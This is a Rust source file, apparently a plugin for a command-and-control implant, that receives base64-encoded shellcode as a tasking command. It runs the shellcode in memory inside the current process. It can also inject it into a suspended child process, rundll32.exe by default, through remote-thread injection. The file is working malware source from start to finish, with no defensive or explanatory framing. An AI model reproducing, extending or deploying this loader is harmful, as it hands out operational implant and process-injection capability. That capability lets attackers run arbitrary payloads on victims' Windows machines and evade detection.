// memload plugin — in-memory payload loading.
//   exec_shellcode (CMD 32): run shellcode in the current process.
//   spawn (CMD 34): suspended child + remote-thread injection.
// Enabled via the "memload" feature.
//
// Args JSON (matches Go loader_cmds.go):
//   { "shellcode": "<base64>", "method": "remote_thread|apc", "process": "<path>" }

use crate::protocol::types::Task;
use crate::registry::{AgentCtx, Registry, TaskResult};
use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;

pub fn register(r: &mut Registry) -> Result<(), String> {
    r.register(crate::protocol::constants::CMD_EXEC_SHELLCODE, exec_shellcode)?;
    r.register(crate::protocol::constants::CMD_SPAWN, exec_spawn)?;
    Ok(())
}

/// Decode `shellcode` from task args (base64).
fn decode_shellcode(args: &str) -> Result<Vec<u8>, String> {
    let v: serde_json::Value =
        serde_json::from_str(args).map_err(|e| format!("invalid args: {e}"))?;
    let sc_b64 = v["shellcode"].as_str().ok_or("no shellcode provided")?;
    let sc = B64.decode(sc_b64).map_err(|e| format!("decode shellcode: {e}"))?;
    if sc.is_empty() {
        return Err("empty shellcode".into());
    }
    Ok(sc)
}

fn exec_shellcode(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let sc = match decode_shellcode(&task.args) {
        Ok(s) => s,
        Err(e) => return Some(TaskResult::fail(&task.id, e)),
    };
    #[cfg(target_os = "windows")]
    {
        match run_in_process(&sc) {
            Ok(_) => Some(TaskResult::ok(&task.id, "shellcode executed\n".into())),
            Err(e) => Some(TaskResult::fail(&task.id, format!("error: {e}"))),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = sc;
        Some(TaskResult::fail(&task.id, "exec_shellcode is Windows-only".into()))
    }
}

fn exec_spawn(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let sc = match decode_shellcode(&task.args) {
        Ok(s) => s,
        Err(e) => return Some(TaskResult::fail(&task.id, e)),
    };
    #[cfg(target_os = "windows")]
    {
        match spawn_injected(&sc, &task.args) {
            Ok(_) => Some(TaskResult::ok(&task.id, "shellcode spawned\n".into())),
            Err(e) => Some(TaskResult::fail(&task.id, format!("error: {e}"))),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = sc;
        Some(TaskResult::fail(&task.id, "spawn is Windows-only".into()))
    }
}

#[cfg(target_os = "windows")]
fn run_in_process(sc: &[u8]) -> Result<(), String> {
    use windows_sys::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
    use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject, INFINITE};

    unsafe {
        let base = VirtualAlloc(
            std::ptr::null(),
            sc.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if base.is_null() {
            return Err("VirtualAlloc failed".into());
        }
        std::ptr::copy_nonoverlapping(sc.as_ptr(), base as *mut u8, sc.len());

        let thread = CreateThread(
            std::ptr::null(),
            0,
            Some(std::mem::transmute(base)),
            std::ptr::null(),
            0,
            std::ptr::null_mut(),
        );
        if thread.is_null() {
            return Err("CreateThread failed".into());
        }
        WaitForSingleObject(thread, INFINITE);
        Ok(())
    }
}

#[cfg(target_os = "windows")]
fn spawn_injected(sc: &[u8], args: &str) -> Result<(), String> {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows_sys::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
    use windows_sys::Win32::System::Threading::{
        CreateProcessA, CreateRemoteThread, ResumeThread, CREATE_SUSPENDED,
        PROCESS_INFORMATION, STARTUPINFOA,
    };

    unsafe {
        let v: serde_json::Value =
            serde_json::from_str(args).unwrap_or(serde_json::Value::Null);
        let proc = v["process"].as_str().unwrap_or("C:\\Windows\\System32\\rundll32.exe");

        let mut si: STARTUPINFOA = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let proc_c = std::ffi::CString::new(proc).map_err(|_| "bad process path".to_string())?;
        let ok = CreateProcessA(
            proc_c.as_ptr() as *const u8,
            std::ptr::null_mut(),
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_SUSPENDED,
            std::ptr::null(),
            std::ptr::null(),
            &si,
            &mut pi,
        );
        if ok == 0 {
            let err = std::io::Error::last_os_error();
            return Err(format!("CreateProcess failed: {}", err));
        }

        // Allocate in the child, write shellcode, then CreateRemoteThread.
        let sc_addr = VirtualAllocEx(
            pi.hProcess,
            std::ptr::null(),
            sc.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if sc_addr.is_null() {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return Err("VirtualAllocEx failed".into());
        }

        let mut written = 0usize;
        if WriteProcessMemory(
            pi.hProcess,
            sc_addr,
            sc.as_ptr() as *const _,
            sc.len(),
            &mut written,
        ) == 0
        {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return Err("WriteProcessMemory failed".into());
        }

        let thread = CreateRemoteThread(
            pi.hProcess,
            std::ptr::null(),
            0,
            Some(std::mem::transmute(sc_addr)),
            std::ptr::null(),
            0,
            std::ptr::null_mut(),
        );
        if thread.is_null() {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return Err("CreateRemoteThread failed".into());
        }

        ResumeThread(pi.hThread);
        CloseHandle(thread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Ok(())
    }
}
